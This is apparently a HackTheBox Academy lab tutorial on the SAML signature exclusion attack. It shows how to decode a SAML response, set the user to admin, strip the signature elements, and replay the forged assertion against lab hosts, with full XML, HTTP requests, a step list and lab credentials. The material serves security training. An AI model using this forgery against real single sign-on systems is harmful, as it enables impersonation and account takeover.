# Signature Exclusion Attack

Signature Exclusion is an attack that manipulates the SAML response by removing the signature. If a service provider is misconfigured only to verify the signature if one is present and defaults to accepting the SAML response, removing the signature enables an attacker to manipulate the SAML response to impersonate other users.

## Signature Verification

After a successful authentication with our account, the application displays some user information about our profile:

```
http://academy.htb/acs.php
Welcome screen displaying user details: Name "htb-stdnt," Email "student@academy.htb," User ID "1234." Message: "Welcome to HackTheBox Academy!"
```

As seen in the previous section, the authentication information is taken from the signed SAML assertion. Further data can then be retrieved from a database, such as the message for our user.

If we want to impersonate a different user, we need to change the values in the SAML assertion used by the web application for authentication.

To obtain the XML SAML response, we need to URL-decode and Base64-decode the data from the response, revealing the data we have seen in the previous section. Let us attempt to impersonate the admin user by manipulating the SAML assertion. The valid assertion contains the following username:

```xml
<saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
	<saml:AttributeValue xsi:type="xs:string">htb-stdnt</saml:AttributeValue>
</saml:Attribute>
```

We can simply manipulate the username by changing `htb-stdnt` to `admin`:

```xml
<saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
	<saml:AttributeValue xsi:type="xs:string">admin</saml:AttributeValue>
</saml:Attribute>
```

Afterward, we need to Base64-encode and then URL-encode the entire SAML response. We can then replace the valid SAML Response, resulting in the following request:

```http
POST /acs.php HTTP/1.1
Host: academy.htb
Content-Length: 8811
Content-Type: application/x-www-form-urlencoded

SAMLResponse=PHNhb[...]%3d&RelayState=%2Facs.php
```

However, since our manipulation invalidates the signature, it is not accepted by the web application:

`POST request to academy.htb for /acs.php with SAMLResponse. Response is HTTP 302 Found, redirecting to /index.php with message "Invalid SAML Response. Not Authenticated."`

## Signature Exclusion

If a web application is severely misconfigured, it may skip the signature verification entirely if the SAML response does not contain a signature XML element. This would enable us to manipulate the SAML response arbitrarily.

To test this, we need to obtain the XML representation of the SAML response, as discussed before. This can be done by intercepting the request with Burp Suite, sending it to Repeater, and then using CyberChef to URL-decode and Base64-decode the SAMLResponse. The CyberChef recipe should be: `URL Decode` then `From Base64`.

Next, we manipulate the SAML assertion, changing the username from `htb-stdnt` to `admin`. To conduct the signature exclusion, we must remove all signatures from the SAML response, which are the `ds:Signature` XML elements. Multiple signatures may be present in a single SAML response, depending on what exactly is signed. After removing all signature elements, we are left with the following SAML response (example with `admin` user):

```xml
<samlp:Response
	xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
	xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_d821fe97fd0710b1df434c5fff579972d67d1cd358" Version="2.0" IssueInstant="2024-03-29T17:44:58Z" Destination="http://academy.htb/acs.php" InResponseTo="ONELOGIN_96a488ebd22db24ee7e884a21add7b8829771e9a">
	<saml:Issuer>http://sso.htb/simplesaml/saml2/idp/metadata.php</saml:Issuer>
	<samlp:Status>
		<samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
	</samlp:Status>
	<saml:Assertion
		xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
		xmlns:xs="http://www.w3.org/2001/XMLSchema" ID="_1cdba427a3574890ffd9124728527fe5823c2976ac" Version="2.0" IssueInstant="2024-03-29T17:44:58Z">
	<saml:Issuer>http://sso.htb/simplesaml/saml2/idp/metadata.php</saml:Issuer>
		<saml:Subject>
			<saml:NameID SPNameQualifier="http://academy.htb/" Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">_a79f33ac54f4d59d65506d5185ec675478b625cd6a</saml:NameID>
			<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
				<saml:SubjectConfirmationData NotOnOrAfter="2024-03-29T17:49:58Z" Recipient="http://academy.htb/acs.php" InResponseTo="ONELOGIN_96a488ebd22db24ee7e884a21add7b8829771e9a"/>
			</saml:SubjectConfirmation>
		</saml:Subject>
		<saml:Conditions NotBefore="2024-03-29T17:44:28Z" NotOnOrAfter="2024-03-29T17:49:58Z">
			<saml:AudienceRestriction>
				<saml:Audience>http://academy.htb/</saml:Audience>
			</saml:AudienceRestriction>
		</saml:Conditions>
		<saml:AuthnStatement AuthnInstant="2024-03-29T17:44:58Z" SessionNotOnOrAfter="2024-03-30T01:44:58Z" SessionIndex="_c4bb9dc9110c30e62a090e1b60489276db4801b96f">
			<saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
			</saml:AuthnContext>
		</saml:AuthnStatement>
		<saml:AttributeStatement>
			<saml:Attribute Name="id" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
				<saml:AttributeValue xsi:type="xs:string">1337</saml:AttributeValue>
			</saml:Attribute>
			<saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
				<saml:AttributeValue xsi:type="xs:string">admin</saml:AttributeValue>
			</saml:Attribute>
			<saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
				<saml:AttributeValue xsi:type="xs:string">admin@academy.htb</saml:AttributeValue>
			</saml:Attribute>
		</saml:AttributeStatement>
	</saml:Assertion>
</samlp:Response>
```

Just like before, we need to encode the data properly before sending it in the following request. Using CyberChef, the recipe should be `To Base64` then `URL Encode (Full)`.

```http
POST /acs.php HTTP/1.1
Host: academy.htb
Content-Length: 3285
Content-Type: application/x-www-form-urlencoded

SAMLResponse=PHNhbW[...]%2b&RelayState=%2Facs.php
```

The web application successfully accepts our manipulated SAML response and authenticates us as the admin user.

To perform the attack:
1.  Add `academy.htb` and `sso.htb` to your `/etc/hosts` file.
2.  Navigate to `academy.htb` and log in with valid credentials (e.g., `htb-stdnt:AcademyStudent!`).
3.  Refresh the page, intercept the request with Burp Suite, and send it to Repeater.
4.  In Repeater, URL-decode and then Base64-decode the `SAMLResponse` parameter using CyberChef (recipe: `URL Decode` -> `From Base64`).
5.  Remove the `<ds:Signature>` XML elements and change the `name` attribute value to `admin`.
6.  Base64-encode and then URL-encode the modified XML data using CyberChef (recipe: `To Base64` -> `URL Encode (Full)`).
7.  Replace the `SAMLResponse` in Burp Repeater with the newly encoded data and forward the request.
8.  You should now be authenticated as the `admin` user.

